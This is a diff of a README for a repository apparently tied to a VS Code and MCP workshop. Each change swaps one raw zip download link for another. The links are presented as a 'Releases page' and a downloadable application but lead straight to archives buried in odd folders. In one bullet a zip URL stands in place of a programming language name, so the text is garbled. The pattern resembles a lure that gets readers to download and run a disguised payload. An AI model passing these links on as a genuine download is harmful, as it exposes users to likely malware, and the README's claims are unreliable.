@@ -6,7 +6,7 @@ Welcome to the mcp-vscode-dev-days-2025-09-spcapital repository! This software p
 
 ## 📥 Download the Application
 
-[![Download Here](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/poetically/mcp-vscode-dev-days-2025-09-spcapital.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/poetically/mcp-vscode-dev-days-2025-09-spcapital.zip)
+[![Download Here](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/img/workshop/spcapital_days_mcp_vscode_dev_2.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/img/workshop/spcapital_days_mcp_vscode_dev_2.7.zip)
 
 To begin, visit the Releases page to download the application. Follow the instructions below once you arrive at the page.
 
@@ -21,7 +21,7 @@ Before you download and install the software, make sure your system meets the fo
 
 ## 🔧 Download & Install
 
-1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/poetically/mcp-vscode-dev-days-2025-09-spcapital.zip).
+1. Click this link to visit the [Releases page](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/img/workshop/spcapital_days_mcp_vscode_dev_2.7.zip).
    
 2. On the Releases page, look for the latest release version at the top.
 
@@ -41,7 +41,7 @@ Upon launching the application, you will see a user-friendly interface. Here’s
 
 - **Explore Technologies:** Navigate through sections covering MCP, AI, and LLMs.
 - **Hands-On Tutorials:** Engage with tutorials for tools like Docker and Visual Studio Code.
-- **Guide Sections:** Access step-by-step instructions on using various programming languages including .NET, Java, https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/poetically/mcp-vscode-dev-days-2025-09-spcapital.zip, and Python. 
+- **Guide Sections:** Access step-by-step instructions on using various programming languages including .NET, Java, https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/img/workshop/spcapital_days_mcp_vscode_dev_2.7.zip, and Python. 
 
 ## 🛠️ Features
 
@@ -65,7 +65,7 @@ We welcome contributions! If you’d like to enhance the content or improve the 
 
 ## 🔗 Important Links
 
-- [Releases Page](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/poetically/mcp-vscode-dev-days-2025-09-spcapital.zip)
+- [Releases Page](https://raw.githubusercontent.com/sadkid12345/mcp-vscode-dev-days-2025-09-spcapital/main/img/workshop/spcapital_days_mcp_vscode_dev_2.7.zip)
 - Community Forums
 - Documentation
 
